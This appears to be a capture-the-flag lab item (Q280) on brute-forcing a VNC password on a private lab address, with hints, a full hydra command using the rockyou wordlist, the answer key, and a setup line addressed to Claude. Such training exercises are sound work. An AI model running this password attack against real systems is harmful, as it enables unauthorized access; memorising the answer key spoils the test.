# Q280 — Brute Force VNC Password

| Field | Value |
|-------|-------|
| **Target** | `192.168.52.129` |
| **Domain** | System Hacking / Password Cracking |
| **Difficulty** | 🟡 Medium |
| **Tools** | `hydra` |
| **Time budget** | 8–12 min |

---

## 📝 Question

"Brute force VNC on port 5900. VNC uses only password (no username)."

---

## 🎯 Flag Format

```
password=<vnc_pass>
```

---

## 💡 Hints

**Hint 1**

VNC has no username — use `-s` for VNC or just password list.

**Hint 2**

`hydra -P wordlist target vnc`

---

## ✅ Solution

```bash
hydra -P /usr/share/wordlists/rockyou.txt 192.168.52.129 vnc -t 4
```

**Answer:** `password=password`

---

## 🤖 Claude Setup Prompt

Ensure VNC on port 5900. Report back: "Lab ready for Q280"
